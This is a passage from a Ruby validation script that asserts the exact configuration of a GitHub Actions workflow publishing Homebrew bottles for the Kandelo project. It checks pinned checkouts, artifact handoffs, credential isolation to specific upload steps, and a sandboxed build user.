          "DRY_RUN" => "${{ inputs.dry-run }}",
          "PLANNED_MATRIX" => "${{ steps.matrix.outputs.matrix }}",
          "REQUIRE_VFS_ACCEPTANCE" => "${{ inputs.require-vfs-acceptance }}",
          "TAP_NAME" => "${{ inputs.tap-name }}",
        }, "publisher VFS acceptance planning mapping changed")
  vfs_selection_run = vfs_selection.fetch("run")
  [
    'tap_root="$(realpath "$GITHUB_WORKSPACE/tap")"',
    'policy_dir="$GITHUB_WORKSPACE/tap/Kandelo"',
    '[ -L "$policy_dir" ] || { [ -e "$policy_dir" ] && [ ! -d "$policy_dir" ]; }',
    'config_candidate="$policy_dir/vfs-acceptance.json"',
    'if [ ! -e "$config_candidate" ] && [ ! -L "$config_candidate" ]; then',
    'if [ "$REQUIRE_VFS_ACCEPTANCE" = "true" ]; then',
    'this invocation requires dependency-bearing VFS acceptance',
    'this invocation will produce no closure acceptance evidence',
    'tap VFS acceptance configuration must be a regular non-symlink file',
    'keys == ["argv", "brewfile", "executable", "expected_stdout", "formula", "schema"]',
    'keys == ["argv", "brewfile", "executable", "expected_stdout", "formula", "schema", "shell_config"]',
    'contains("\u000a") == false', 'contains("\u000d") == false',
    'config="$(realpath "$config_candidate")"',
    'tap VFS acceptance configuration resolved outside the exact tap checkout',
    'formula_candidate="$GITHUB_WORKSPACE/tap/Formula/${selected_formula}.rb"',
    'formula_source="$(realpath "$formula_candidate")"',
    'selected VFS acceptance Formula resolved outside the exact tap checkout',
    'brewfile_candidate="$GITHUB_WORKSPACE/tap/$brewfile_rel"',
    '[ -f "$brewfile_candidate" ] && [ ! -L "$brewfile_candidate" ]',
    'brewfile="$(realpath "$brewfile_candidate")"',
    'shell_config_candidate="$GITHUB_WORKSPACE/tap/$shell_config_rel"',
    'tap default-shell config must be a regular non-symlink file',
    'default-shell config resolved outside the exact tap checkout',
    'default-shell config must contain 1 to 65536 bytes',
    'keys == ["argv", "path", "version"]',
    '/home/linuxbrew/', '(bin|sbin)',
    'ruby kandelo/scripts/homebrew-brewfile-selection.rb "$brewfile"',
    'expected_tap="$(printf \'%s\' "$TAP_NAME" | tr \'[:upper:]\' \'[:lower:]\')"',
    '.tap_name == $tap and (.packages | index($formula) != null)',
    'any(.[]; .formula == $formula and .arch == "wasm32")',
    'required dependency-bearing VFS acceptance needs a non-dry-run publication',
    'use force when its bottle is already current',
  ].each do |fragment|
    check(vfs_selection_run.include?(fragment),
          "publisher VFS acceptance planning lacks #{fragment}")
  end
  check(vfs_selection_run.match?(
          /if \[ ! -e "\$config_candidate" \] && \[ ! -L "\$config_candidate" \]; then\n\s+if \[ "\$REQUIRE_VFS_ACCEPTANCE" = "true" \]; then\n\s+echo "::error::[^\n]+"\n\s+exit 1\n\s+fi\n\s+echo "::notice::[^\n]+no closure acceptance evidence"\n\s+exit 0/
        ), "publisher does not distinguish optional absence from required VFS acceptance")
  tap_checkout = named_step(plan_steps, "Checkout tap")
  matrix_plan = named_step(plan_steps, "Plan formula matrix")
  check(plan_steps.index(tap_checkout) < plan_steps.index(matrix_plan) &&
        plan_steps.index(matrix_plan) < plan_steps.index(vfs_selection),
        "publisher validates VFS acceptance selection outside the planning trust boundary")
  check(matrix_plan.keys.sort == %w[env id name run shell] &&
        matrix_plan["id"] == "matrix" && matrix_plan["shell"] == "bash" &&
        matrix_plan["env"] == {
          "ARCHES" => "${{ inputs.arches }}",
          "EXPECTED_ABI" => "${{ steps.release.outputs.abi }}",
          "EXPECTED_BOTTLE_ROOT_URL" =>
            "${{ steps.release.outputs.bottle-root-prefix }}",
          "EXPECTED_CACHE_KEYS_JSON" => "${{ inputs.expected-cache-keys }}",
          "FORCE_REBUILD" => "${{ inputs.force }}",
          "FORMULAE" => "${{ inputs.formulae }}",
        }, "publisher matrix planner mapping changed")
  matrix_plan_run = matrix_plan.fetch("run")
  [
    'expected_args+=(--expected-cache-keys "$expected_file")',
    'expected_args+=(--expected-abi "$EXPECTED_ABI")',
    'expected_args+=(--expected-bottle-root-url "$EXPECTED_BOTTLE_ROOT_URL")',
    '--tap-root "$GITHUB_WORKSPACE/tap"', '--formulae "$FORMULAE"',
    '--arches "$ARCHES"', '"${expected_args[@]}"',
  ].each do |fragment|
    check(matrix_plan_run.include?(fragment),
          "publisher matrix planner lacks #{fragment}")
  end
  check(matrix_plan_run.scan("--expected-bottle-root-url").length == 1,
        "publisher matrix planner root argument changed")

  release_step = named_step(plan_steps, "Resolve release and bottle root")
  check(release_step.fetch("env") == {
    "REQUESTED_BOTTLE_ROOT_URL" => "${{ inputs.bottle-root-url }}",
    "REQUESTED_RELEASE_TAG" => "${{ inputs.release-tag }}",
    "TAP_NAME" => "${{ inputs.tap-name }}",
    "TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
  }, "publisher bottle root identity mapping changed")
  release_run = release_step.fetch("run")
  check(release_run.include?('expected_release_tag="bottles-abi-v${abi}"') &&
        release_run.include?('[ "$release_tag" != "$expected_release_tag" ]') &&
        release_run.include?('. kandelo/scripts/homebrew-tap-identity.sh') &&
        release_run.include?(
          'homebrew_bottle_root_url "$TAP_REPOSITORY" "$TAP_NAME"'
        ), "publisher does not bind release tag and bottle root to resolved identities")
  planner_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-plan-matrix.sh"))
  check(planner_source.include?("formula selection must not be empty") &&
        planner_source.include?("architecture selection must not be empty"),
        "publisher planner permits a green empty dispatch")
  dependency_taps_source = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-dependency-taps.py")
  )
  [
    '"kandelo-dev/tap-core": "kandelo-dev/homebrew-tap-core"',
    'COMMIT = re.compile(r"^[0-9a-f]{40}$")',
    'if ALLOWED_DEPENDENCY_TAPS.get(name) != repository:',
    'git_output(root, "status", "--short", "--untracked-files=all")',
    'if set(dependency_roots) != expected_names:',
    'verify_checkout(root, item["tap_commit"]',
    'write_json(pathlib.Path(args.out), resolved)',
  ].each do |fragment|
    check(dependency_taps_source.include?(fragment),
          "publisher immutable dependency-tap resolver lacks #{fragment}")
  end
  check(plan["outputs"] == {
    "matrix" => "${{ steps.matrix.outputs.matrix }}",
    "formula-matrix" => "${{ steps.matrix.outputs.formula-matrix }}",
    "abi" => "${{ steps.release.outputs.abi }}",
    "release-tag" => "${{ steps.release.outputs.release-tag }}",
    "bottle-root-prefix" => "${{ steps.release.outputs.bottle-root-prefix }}",
    "kandelo-sha" => "${{ steps.source-commits.outputs.kandelo-sha }}",
    "tap-sha" => "${{ steps.source-commits.outputs.tap-sha }}",
    "core-dependency-tap-sha" => "${{ steps.dependency-taps.outputs.core-tap-sha }}",
  }, "publisher plan outputs changed")

  expected_uses = [
    *Array.new(29, CHECKOUT_ACTION),
    *Array.new(5, NIX_ACTION),
    *Array.new(2, MAGIC_NIX_ACTION),
    *Array.new(7, UPLOAD_ACTION),
    *Array.new(9, DOWNLOAD_ACTION),
  ].sort
  check(values_for_key(workflow, "uses").sort == expected_uses,
        "publisher action set or pin changed")

  checkout_view = lambda do |steps|
    steps.select { |step| step["uses"] == CHECKOUT_ACTION }.map do |step|
      { "name" => step["name"], "if" => step["if"], "with" => step["with"] }
    end
  end
  core_checkout = lambda do |name, condition, ref, path|
    {
      "name" => name, "if" => condition,
      "with" => {
        "persist-credentials" => false, "token" => "",
        "repository" => "kandelo-dev/homebrew-tap-core",
        "ref" => ref, "path" => path,
      },
    }
  end
  check(checkout_view.call(plan_steps) == [
    {
      "name" => "Checkout Kandelo workflow source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ steps.trust.outputs.kandelo-ref }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout tap", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ steps.trust.outputs.tap-ref }}", "path" => "tap",
      },
    },
    core_checkout.call(
      "Checkout exact public core dependency tap",
      "${{ steps.dependency-taps.outputs.core-tap-sha != '' }}",
      "${{ steps.dependency-taps.outputs.core-tap-sha }}", "dependency-taps/core"
    ),
  ], "publisher plan checkout wiring changed")
  check(checkout_view.call(build_steps) == [
    {
      "name" => "Checkout Kandelo workflow source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout tap", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
      },
    },
    core_checkout.call(
      "Checkout exact public core dependency tap for build",
      "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
      "${{ needs.plan.outputs.core-dependency-tap-sha }}", "dependency-taps/core"
    ),
    {
      "name" => "Checkout reviewed Homebrew implementation", "if" => nil,
      "with" => {
        "persist-credentials" => false, "repository" => "Homebrew/brew",
        "ref" => BREW_COMMIT, "path" => "homebrew-prefix/Homebrew",
      },
    },
    {
      "name" => "Checkout exact post-build Kandelo validator source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo-postbuild", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact post-build tap source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap-reviewed",
      },
    },
    core_checkout.call(
      "Checkout exact post-build core dependency tap source",
      "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
      "${{ needs.plan.outputs.core-dependency-tap-sha }}",
      "dependency-taps/core-reviewed"
    ),
  ], "publisher build checkout wiring changed")
  check(checkout_view.call(upload_steps) == [
    {
      "name" => "Checkout exact Kandelo validator source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact tap source for upload validation", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
      },
    },
    core_checkout.call(
      "Checkout exact public core dependency tap for upload validation",
      "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
      "${{ needs.plan.outputs.core-dependency-tap-sha }}", "dependency-taps/core"
    ),
  ], "publisher uploader checkout wiring changed")
  check(checkout_view.call(index_steps) == [
    {
      "name" => "Checkout exact Kandelo index publisher source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact tap source for index validation", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
      },
    },
    core_checkout.call(
      "Checkout exact public core dependency tap for index validation",
      "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
      "${{ needs.plan.outputs.core-dependency-tap-sha }}", "dependency-taps/core"
    ),
  ], "publisher version-index checkout wiring changed")
  check(checkout_view.call(verify_steps) == [
    {
      "name" => "Checkout exact Kandelo verifier source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact Kandelo sysroot build source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo-sysroot-build", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact tap source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
      },
    },
    core_checkout.call(
      "Checkout exact public core dependency tap for verification",
      "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
      "${{ needs.plan.outputs.core-dependency-tap-sha }}", "dependency-taps/core"
    ),
    {
      "name" => "Checkout reviewed Homebrew implementation for bottle verification", "if" => nil,
      "with" => {
        "persist-credentials" => false, "repository" => "Homebrew/brew",
        "ref" => BREW_COMMIT, "path" => "homebrew-prefix/Homebrew",
      },
    },
    {
      "name" => "Checkout exact post-verification Kandelo generator source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo-postverify", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact post-verification tap source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap-postverify",
      },
    },
    core_checkout.call(
      "Checkout exact post-verification core dependency tap source",
      "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
      "${{ needs.plan.outputs.core-dependency-tap-sha }}",
      "dependency-taps/core-postverify"
    ),
  ], "publisher verifier checkout wiring changed")

  failure_condition = "${{ always() && (steps.publish-handoff.outcome != 'success' || " \
                      "steps.validate-payload.outcome != 'success' || steps.publish.outcome != 'success') }}"
  check(checkout_view.call(finalize_steps) == [
    {
      "name" => "Checkout exact Kandelo finalizer source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact base tap without credentials", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap-base",
      },
    },
    core_checkout.call(
      "Checkout exact public core dependency tap for finalization",
      "${{ needs.plan.outputs.core-dependency-tap-sha != '' }}",
      "${{ needs.plan.outputs.core-dependency-tap-sha }}", "dependency-taps/core"
    ),
    {
      "name" => "Checkout tap publication branch after payload validation",
      "if" => "${{ steps.validate-payload.outcome == 'success' }}",
      "with" => {
        "repository" => "${{ inputs.tap-repository }}", "ref" => "main",
        "path" => "tap-publish", "fetch-depth" => 0,
      },
    },
    {
      "name" => "Checkout clean tap for a failed-attempt report", "if" => failure_condition,
      "with" => {
        "repository" => "${{ inputs.tap-repository }}", "ref" => "main",
        "path" => "tap-report", "fetch-depth" => 0,
      },
    },
  ], "publisher finalizer checkout wiring changed")

  credential_names = %w[
    GH_TOKEN GITHUB_TOKEN HOMEBREW_GITHUB_API_TOKEN HOMEBREW_GITHUB_PACKAGES_TOKEN
    HOMEBREW_DOCKER_REGISTRY_TOKEN
  ]
  [build_steps, verify_steps].each do |steps|
    exposed = steps.flat_map { |step| step.fetch("env", {}).keys & credential_names }
    check(exposed.empty?, "unprivileged publisher phase exposes a credential environment")
    check(steps.select { |step| step["uses"] == CHECKOUT_ACTION }.all? do |step|
      step.dig("with", "persist-credentials") == false
    end, "unprivileged publisher phase persists checkout credentials")
  end
  uploader_credential_steps = upload_steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(uploader_credential_steps.map { |step| step["name"] } ==
        ["Upload validated bottle in isolated ORAS auth state"] &&
        uploader_credential_steps.first["env"] == {
          "GH_TOKEN" => "${{ github.token }}",
          "KANDELO_HOMEBREW_FORMULA" => "${{ matrix.formula }}",
          "KANDELO_HOMEBREW_TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "KANDELO_HOMEBREW_TAP_NAME" => "${{ inputs.tap-name }}",
        },
        "publisher uploader credentials escape the isolated upload step")
  index_credential_steps = index_steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(index_credential_steps.map { |step| step["name"] } ==
        ["Publish the complete Homebrew version index in isolated ORAS auth state"] &&
        index_credential_steps.first["env"] == {
          "GH_TOKEN" => "${{ github.token }}",
          "KANDELO_HOMEBREW_FORMULA" => "${{ matrix.formula }}",
          "KANDELO_HOMEBREW_TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "KANDELO_HOMEBREW_TAP_NAME" => "${{ inputs.tap-name }}",
        },
        "publisher version-index credentials escape the isolated transport step")
  finalizer_credential_steps = finalize_steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(finalizer_credential_steps.map { |step| step["name"] } == [
    "Publish validated sidecars under the tap state lock",
    "Record failed attempt without replacing last-green metadata",
  ] && finalizer_credential_steps.all? do |step|
    step.fetch("env").slice(*credential_names) == { "GH_TOKEN" => "${{ github.token }}" }
  end, "publisher finalizer credentials escape tap write steps")

  build_handoff_name =
    "homebrew-build-handoff-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
  upload_receipt_name =
    "homebrew-upload-receipt-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
  publish_handoff_name =
    "homebrew-publish-handoff-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
  child_layout_name =
    "homebrew-oci-child-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
  index_publication_name =
    "homebrew-index-publication-${{ matrix.formula }}-attempt-${{ github.run_attempt }}"
  build_handoff_upload = named_step(build_steps, "Upload strict bottle build handoff")
  check(build_handoff_upload["uses"] == UPLOAD_ACTION && build_handoff_upload["with"] == {
    "name" => build_handoff_name,
    "path" => "${{ runner.temp }}/homebrew-build-handoff",
    "compression-level" => 0,
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher build handoff artifact contract changed")
  child_layout_upload = named_step(build_steps, "Upload deterministic Homebrew OCI child")
  check(child_layout_upload["uses"] == UPLOAD_ACTION && child_layout_upload["with"] == {
    "name" => child_layout_name,
    "path" => "${{ runner.temp }}/homebrew-oci-child",
    "compression-level" => 0,
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher OCI child artifact contract changed")
  upload_handoff_download = named_step(upload_steps, "Download strict build handoff")
  verify_handoff_download = named_step(verify_steps, "Download strict build handoff")
  [upload_handoff_download, verify_handoff_download].each do |step|
    check(step["uses"] == DOWNLOAD_ACTION && step["id"] == "build-handoff" &&
          step["continue-on-error"] == true && step["with"] == {
            "name" => build_handoff_name,
            "path" => "${{ runner.temp }}/homebrew-build-handoff",
          }, "publisher build handoff download contract changed")
  end
  upload_child_download = named_step(upload_steps, "Download deterministic Homebrew OCI child")
  verify_child_download = named_step(
    verify_steps, "Download deterministic Homebrew OCI child for dry-run validation"
  )
  [upload_child_download, verify_child_download].each do |step|
    check(step["uses"] == DOWNLOAD_ACTION && step["id"] == "oci-child" &&
          step["continue-on-error"] == true && step["with"] == {
            "name" => child_layout_name,
            "path" => "${{ runner.temp }}/homebrew-oci-child",
          }, "publisher OCI child download contract changed")
  end
  receipt_upload = named_step(upload_steps, "Upload strict upload receipt")
  check(receipt_upload["uses"] == UPLOAD_ACTION && receipt_upload["with"] == {
    "name" => upload_receipt_name,
    "path" => "${{ runner.temp }}/homebrew-upload-receipt/receipt.json",
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher upload receipt artifact contract changed")
  receipt_download = named_step(verify_steps, "Download strict upload receipt")
  check(receipt_download["uses"] == DOWNLOAD_ACTION && receipt_download["id"] == "upload-receipt" &&
        receipt_download["if"] == "${{ !inputs.dry-run }}" &&
        receipt_download["continue-on-error"] == true && receipt_download["with"] == {
          "name" => upload_receipt_name,
          "path" => "${{ runner.temp }}/homebrew-upload-receipt",
  }, "publisher receipt download contract changed")
  index_child_download = named_step(index_steps, "Download immutable OCI child layouts")
  check(index_child_download["uses"] == DOWNLOAD_ACTION && index_child_download["with"] == {
    "pattern" => "homebrew-oci-child-${{ matrix.formula }}-*-attempt-${{ github.run_attempt }}",
    "path" => "${{ runner.temp }}/homebrew-oci-children",
    "merge-multiple" => false,
  }, "publisher version-index child artifact download contract changed")
  index_receipt_download = named_step(
    index_steps, "Download public child publication receipts"
  )
  check(index_receipt_download["uses"] == DOWNLOAD_ACTION && index_receipt_download["with"] == {
    "pattern" => "homebrew-upload-receipt-${{ matrix.formula }}-*-attempt-${{ github.run_attempt }}",
    "path" => "${{ runner.temp }}/homebrew-child-publications",
    "merge-multiple" => false,
  }, "publisher version-index publication artifact download contract changed")
  index_publication_upload = named_step(index_steps, "Upload public Homebrew version-index evidence")
  check(index_publication_upload["uses"] == UPLOAD_ACTION &&
        index_publication_upload["with"] == {
          "name" => index_publication_name,
          "path" => "${{ runner.temp }}/homebrew-complete-index/layout-receipt.json\n" \
                    "${{ runner.temp }}/homebrew-complete-index/transport-receipt.json\n",
          "compression-level" => 0,
          "if-no-files-found" => "error", "retention-days" => 2,
        }, "publisher version-index publication artifact contract changed")
  index_publication_download = named_step(
    verify_steps, "Download public Homebrew version-index evidence"
  )
  check(index_publication_download["uses"] == DOWNLOAD_ACTION &&
        index_publication_download["id"] == "index-publication" &&
        index_publication_download["if"] == "${{ !inputs.dry-run }}" &&
        index_publication_download["continue-on-error"] == true &&
        index_publication_download["with"] == {
          "name" => index_publication_name,
          "path" => "${{ runner.temp }}/homebrew-index-publication",
        }, "publisher version-index evidence download contract changed")
  publish_handoff_upload = named_step(verify_steps, "Upload validated publication handoff")
  check(publish_handoff_upload["uses"] == UPLOAD_ACTION && publish_handoff_upload["with"] == {
    "name" => publish_handoff_name,
    "path" => "${{ runner.temp }}/homebrew-publish-handoff",
    "compression-level" => 0,
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher publication handoff artifact contract changed")
  publish_handoff_download = named_step(finalize_steps, "Download validated publication handoff")
  check(publish_handoff_download["uses"] == DOWNLOAD_ACTION &&
        publish_handoff_download["id"] == "publish-handoff" &&
        publish_handoff_download["continue-on-error"] == true &&
        publish_handoff_download["with"] == {
          "name" => publish_handoff_name,
          "path" => "${{ runner.temp }}/homebrew-publish-handoff",
        }, "publisher publication handoff download contract changed")

  build_run = named_step(build_steps,
                         "Build and test Homebrew bottle without publisher credentials").fetch("run")
  check(build_run.include?("unprivileged bottle build received $secret_name") &&
        build_run.include?("scripts/homebrew-bottle-build.sh") &&
        build_run.include?('readlink -f "$HOMEBREW_BREW_FILE"') &&
        build_run.include?('"$HOMEBREW_BREW_FILE" --repository'),
        "publisher build phase no longer rejects credentials or uses the reviewed builder")
  [
    '/usr/bin/od -An -N32 -tx1 /dev/urandom', "/usr/bin/tr -d ' \\n'",
    '[[ "$workflow_command_token" =~ ^[0-9a-f]{64}$ ]]',
    "trap restore_workflow_commands_on_exit EXIT",
    "workflow_commands_stopped=1",
    "printf '::stop-commands::%s\\n' \"$workflow_command_token\"",
    "printf '::%s::\\n' \"$workflow_command_token\"",
    'status="$?"', 'exit "$status"', "resume_workflow_commands", "trap - EXIT",
  ].each do |fragment|
    check(build_run.include?(fragment), "publisher Formula output boundary lacks #{fragment}")
  end
  stop_commands_index = build_run.index("printf '::stop-commands::%s\\n'")
  builder_index = build_run.index("bash scripts/homebrew-bottle-build.sh")
  resume_commands_index = build_run.rindex("resume_workflow_commands")
  check(stop_commands_index && builder_index && resume_commands_index &&
        stop_commands_index < builder_index && builder_index < resume_commands_index,
        "publisher Formula output is not enclosed by the workflow-command boundary")
  check(!build_run.match?(/(?:export|readonly|declare\s+-x)\s+workflow_command_token/) &&
        !build_run.include?("GITHUB_ENV=$workflow_command_token") &&
        build_run.scan(/workflow_command_token/).length == 4,
        "publisher exports the workflow-command token to Formula execution")
  check(!values_for_key(workflow, "run").join("\n").include?("GITHUB_PATH"),
        "publisher exposes a writable Homebrew prefix through job PATH")
  identity_step = named_step(build_steps, "Create isolated Formula execution identity")
  check(identity_step.keys.sort == %w[id name run shell] &&
        identity_step["id"] == "formula-identity" && identity_step["shell"] == "bash",
        "publisher Formula execution identity mapping changed")
  identity_run = identity_step.fetch("run")
  [
    'build_user="kandelo-homebrew-build"',
    'sudo_bin="/usr/bin/sudo"',
    'systemd_run_bin="/usr/bin/systemd-run"',
    'systemctl_bin="/usr/bin/systemctl"',
    'getent_bin="/usr/bin/getent"',
    'findmnt_bin="/usr/bin/findmnt"',
    'pgrep_bin="/usr/bin/pgrep"',
    'pkill_bin="/usr/bin/pkill"',
    'useradd_bin="/usr/sbin/useradd"',
    'userdel_bin="/usr/sbin/userdel"',
    'sudo_mode="$(stat -c \'%a\' "$sudo_bin"',
    'stat -c \'%u\' "$sudo_bin"',
    '8#$sudo_mode & 0022',
    'pkill_target="$(readlink -f -- "$pkill_bin"',
    '"$sudo_bin" -n -- "$useradd_bin" --system --user-group --create-home',
    'echo "created=true" >> "$GITHUB_OUTPUT"',
    '[ "$(id -u "$build_user")" != "$(id -u)" ]',
    '"$sudo_bin" -n -u "$build_user" -- "$sudo_bin" -n true',
    'shared_temp="$(mktemp -d /tmp/kandelo-homebrew.XXXXXX)"',
    '"$sudo_bin" chmod 1777 "$shared_temp"',
    'echo "KANDELO_HOMEBREW_BUILD_USER=$build_user"',
    'echo "KANDELO_HOMEBREW_SHARED_TEMP=$shared_temp"',
    'echo "KANDELO_HOMEBREW_SUDO_BIN=$sudo_bin"',
    'echo "KANDELO_HOMEBREW_SYSTEMD_RUN_BIN=$systemd_run_bin"',
    'echo "KANDELO_HOMEBREW_SYSTEMCTL_BIN=$systemctl_bin"',
    'echo "KANDELO_HOMEBREW_GETENT_BIN=$getent_bin"',
    'echo "KANDELO_HOMEBREW_PGREP_BIN=$pgrep_bin"',
    'echo "KANDELO_HOMEBREW_PKILL_BIN=$pkill_bin"',
    "--expand-environment=",
    'echo "HOMEBREW_CACHE=$shared_temp/cache"',
    'echo "HOMEBREW_TEMP=$shared_temp/tmp"',
  ].each do |fragment|
    check(identity_run.include?(fragment),
          "publisher Formula execution identity lacks #{fragment}")
  end
  dev_shell = File.read(File.join(REPO_ROOT, "scripts/dev-shell.sh"))
  check(%w[
    KANDELO_HOMEBREW_BUILD_USER KANDELO_HOMEBREW_SHARED_TEMP
    KANDELO_HOMEBREW_SUDO_BIN KANDELO_HOMEBREW_SYSTEMD_RUN_BIN
    KANDELO_HOMEBREW_SYSTEMCTL_BIN KANDELO_HOMEBREW_GETENT_BIN
    KANDELO_HOMEBREW_PGREP_BIN
    KANDELO_HOMEBREW_PKILL_BIN
  ].all? { |name| dev_shell.include?("--keep #{name}") },
        "dev shell drops the isolated Formula build identity")
  check(%w[
    KANDELO_HOMEBREW_BUILD_ROOT KANDELO_HOMEBREW_RUNTIME_EVIDENCE
    KANDELO_HOMEBREW_BROWSER_EVIDENCE
  ].all? { |name| dev_shell.include?("--keep #{name}") },
        "dev shell drops exact Homebrew runtime evidence inputs")
  check(!dev_shell.include?("--keep KANDELO_HOMEBREW_RESOLVED_TAPS_FILE"),
        "dev shell globally preserves Homebrew resolved-tap state and invalidates package caches")
  resolved_taps_forwarding =
    'KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$KANDELO_HOMEBREW_RESOLVED_TAPS_FILE" \\'
  check(values_for_key(workflow, "run").join("\n").scan(resolved_taps_forwarding).length == 12,
        "publisher does not explicitly carry immutable resolved taps across every consuming dev-shell boundary")
  check(!dev_shell.include?("--keep KANDELO_HOMEBREW_TAP_NAME"),
        "dev shell globally preserves caller-selected Homebrew tap identity")
  flake = File.binread(File.join(REPO_ROOT, "flake.nix"))
  check(flake.scan("pkgs.gnutar".b).length == 1,
        "dev shell does not declare exactly one GNU tar publisher input")
  bottle_builder = File.read(File.join(REPO_ROOT, "scripts/homebrew-bottle-build.sh"))
  formula_closure = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-formula-runtime-closure.rb")
  )
  [
    'context_repository == repository_for_tap.call(context_name)',
    'dependency Formula uses an undeclared tap',
    'host dependency plan requires an immutable resolved tap map',
    '"tap_name" => context.fetch("tap_name")',
    '"tap_repository" => context.fetch("tap_repository")',
    '"tap_commit" => commit',
    '"target_taps" => immutable_target_taps',
  ].each do |fragment|
    check(formula_closure.include?(fragment),
          "static Formula closure lacks immutable tap identity binding: #{fragment}")
  end
  [
    'homebrew_patched_launcher_isolate "$BUILD_USER"',
    'homebrew_patched_launcher_teardown "$BUILD_USER"',
    "homebrew_patched_launcher_verify_isolation",
    '"$WORK_DIR" "$KANDELO_ROOT" "$TAP_ROOT" "$OUT_DIR" "$KANDELO_ROOT"',
    "CI Formula execution requires KANDELO_HOMEBREW_BUILD_USER",
    'mktemp -d "$SHARED_TEMP/homebrew-build.XXXXXX"',
    'NATIVE_BASE="$(mktemp -d /tmp/k.XXXXXX)"',
    'NATIVE_BASE="$(cd "$NATIVE_BASE" && pwd -P)"',
    'NATIVE_BUILD_ROOT="$NATIVE_BASE"',
    'CONTROL_DIR="$(mktemp -d "$OUT_DIR/.control.XXXXXX")"',
    'chmod 0700 "$CONTROL_DIR"',
    'INSTALL_LOG="$CONTROL_DIR/brew-install.log"',
    'NATIVE_INSTALL_LOG="$CONTROL_DIR/native-brew-install.log"',
    'HOST_DEPENDENCY_PLAN="$CONTROL_DIR/host-dependencies.json"',
    'TARGET_BOTTLE_IDENTITY="$CONTROL_DIR/target-bottle-identity.json"',
    'HOST_DEPENDENCY_LIST="$CONTROL_DIR/host-dependencies.txt"',
    'DEPENDENCY_LIST="$CONTROL_DIR/same-tap-dependencies.txt"',
